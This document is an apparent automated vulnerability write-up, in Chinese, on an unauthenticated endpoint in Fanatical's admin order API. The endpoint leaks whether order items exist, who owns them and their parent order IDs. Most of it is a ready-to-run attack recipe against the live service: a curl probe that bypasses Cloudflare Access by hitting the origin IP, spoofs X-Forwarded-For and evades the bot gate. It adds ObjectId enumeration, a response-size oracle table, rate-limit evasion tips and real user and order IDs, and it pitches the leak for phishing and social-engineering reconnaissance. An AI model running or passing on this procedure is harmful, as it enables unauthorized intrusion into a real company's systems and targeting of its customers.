# Fanatical v-keyless-return 未鉴权订单项 oracle

## 0. 一句话
`GET https://admin.fanatical.com/api/orders/v-keyless-return/{userId}/{orderItemId}` 不需要任何 Cookie / Authorization / 会话。仅凭 URL 路径即可区分「条目是否存在 / 是否 keyless 发号项 / 是否归属该 userId / 是否已处理」，并在 302 的 `Location` 中回显该条目所属的真实 `orderId`（itemId→orderId 映射泄露）。

## 1. 前置条件
- 出网 443；无任何账号、会话、令牌。
- 一个语法合法的 **24 位 hex** ObjectId 作为 `orderItemId`。来源：
  - Wayback CDX 里归档的 `https://www.fanatical.com/orders/<orderId>?keylessReturn=1&keylessIid=<orderItemId>` 链接；
  - 已知真实 orderId 时，围绕其时间戳前缀做 ObjectId 计数器枚举（同批创建的对象前缀相同、末几位递增）。
- 源站直连需 `--noproxy '*'`（否则本机代理会重解析 DNS，`--resolve` 失效、请求回到 Cloudflare Access）。
- 源站 IP 会变，先现取：`nslookup -type=A admin.fanatical.com.herokudns.com 1.1.1.1`。
- 浏览器类 UA；`anonid` 用合法 UUIDv4（www 边缘门禁用），源站直连时也建议带上保持一致。

## 2. 复现命令
```bash
IP=$(nslookup -type=A admin.fanatical.com.herokudns.com 1.1.1.1 | awk '/^Address: /{print $2}' | tail -1)
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'

probe(){  # $1 = /api/...
  curl -sk --noproxy '*' --max-time 20 --resolve admin.fanatical.com:443:$IP \
    -A "$UA" -H "anonid: $(cat /proc/sys/kernel/random/uuid)" \
    -H "X-Forwarded-For: 198.51.100.$((RANDOM%200+10))" \
    -o /tmp/body -D /tmp/hdr \
    -w 'code=%{http_code} len=%{size_download}\n' \
    "https://admin.fanatical.com$1"
  grep -i '^location:' /tmp/hdr
}

# ① 存在性基线：随机 userId + 随机 itemId
probe /api/orders/v-keyless-return/aaaaaaaaaaaaaaaaaaaaaaaa/bbbbbbbbbbbbbbbbbbbbbbbb
# → 400 len=0

# ② 真实但非 keyless 的订单项（会泄露父 orderId）
probe /api/orders/v-keyless-return/aaaaaaaaaaaaaaaaaaaaaaaa/5f97e86b9502a300969ff82f
# → 302 len=177  Location: https://www.fanatical.com/orders/5f97e86b9502a300969ff838?...errorMessage=Not%20A%20Keyless%20Order%20Item

# ③ 把 userId 换成订单所有者 → 仍 177B（类型分支先于归属分支）
probe /api/orders/v-keyless-return/561da489d3b0509c388fa517/5f97e86b9502a300969ff82f

# ④ 下游数据面仍需鉴权（证明影响上限）
probe /api/user/orders/561da489d3b0509c388fa517
# → 401 len=28  {"message":"Missing authorization header"}（示例）
```

命中时的真实 302 形态：
```
HTTP/2 302
location: https://www.fanatical.com/orders/69d2dd74747f9...90f4360b7?keylessReturn=1&keylessIid=<itemId>&errorMessage=Unexpected%20Error,%20please%20contact%20Customer%20Support
```
（`?code=403&error=Order already processed` 附在请求后时，errorMessage 变为 `Order%20Already%20Processed`，body 172B）
示例中父 orderId 与被测 itemId 仅末位相差 1（…b7 vs …b8），反映二者由同一 ObjectId 计数器相邻生成。

## 3. 判据表（全部无需会话）
| 观测 | 结论 |
|---|---|
| `400`，body `0B` | itemId 不存在 **或** 不是合法 24hex（两种情况同回显，需先确保格式合法再判「不存在」） |
| `302`，`len=177`，errorMessage=`Not A Keyless Order Item` | 条目真实存在、但不是 keyless 发号项；**与 userId 无关**，不要用它判归属；Location 泄露父 orderId |
| `302`，`len=161`，errorMessage=`Incorrect User` | 是 keyless 发号项，但不归属路径中的 userId；Location 同样泄露父 orderId |
| `302`，`len=204`，errorMessage=`Unexpected Error, please contact Customer Support` | userId 即所有者（归属校验只靠 URL 路径），条目已处理 |
| `302`，`len=172`，errorMessage=`Order Already Processed` | 同上，更明确的「已处理」分支（请求尾部加 `?code=403&error=Order already processed`） |

要点：
- 字节数是 `size_download`（重定向响应体长度），是稳定判据；同时看 `Location` 里的 `errorMessage` 交叉确认。
- 302 的 `Location` 前缀始终是 `https://www.fanatical.com/orders/<真实父 orderId>`，随机 userId 也照样回显 → itemId→orderId 映射泄露。
- `anonid` / `X-Anonid` / `Cookie: anonid=` / `Cookie: aid=` / `?aid=` 五种形态对结果 **无影响**，不是身份键（对照 `/api/basket` 才是 anonid 头为身份）。
- www 边缘路径 `/api/orders/v-keyless-return/...` 与 admin 源站行为一致。

## 4. 失败/误判常见原因
1. `302 → https://fanatical.cloudflareaccess.com/...`：没打到源站。检查是否漏了 `--noproxy '*'`，或 `--resolve` 用了过期 IP。
2. `403` 15B `Request blocked`：UA 是裸 curl 或缺少 `anonid`（边缘 bot 门禁）；换浏览器 UA。
3. `400 0B` 就断言不存在：ObjectId 位数/字符不合法也回 400，先 `grep -E '^[0-9a-f]{24}$'` 校验输入。
4. 用 `-L` 跟随重定向：会跟到 www 的 SPA 并返回 200，丢掉 `Location` 里的全部判据；不要跟随。
5. `429`：该路由族在实测中 250+ 请求未限速；若出现，换出口 IP / 降速，不要伪造 XFF（redeem-code 路由族的令牌桶不吃 XFF）。
6. 把 177B 当成「归属错误」：类型分支先于归属分支，非 keyless 项换任何 userId 都是 177B。

## 5. 影响上限（负面边界，别过度投入）
- 仅信息泄露：确认条目存在性、是否 keyless、是否归属某 userId、是否已处理，以及父 orderId。
- 归档的 8 组 (userId,itemId) 全部落在「已处理」分支，**未取得任何 key / 序列号 / 领取 URL**。
- 拿到 orderId 后，`/api/user/orders/{id}` 仍需 Authorization：无头 → `401 28B Missing authorization header`。
- 因此该入口适合做侦察/关联（把散落的 itemId 归并到 orderId、确认账号归属、为后续社工/钓鱼准备上下文），不能直接兑换/取号。

## 6. 溯源
- 原始 finding_id=170（task#3，verdict=verified / status=confirmed）。
- 归档链接对：Wayback CDX（落盘 `/opt/artex/data/tasks/3/i2811/cdx_domain_all.json`）。
- 本次复测：2026-11-12，curl `--noproxy '*' --resolve admin.fanatical.com:443:3.33.161.45`，逐请求唯一 `anonid` + 唯一 `X-Forwarded-For`。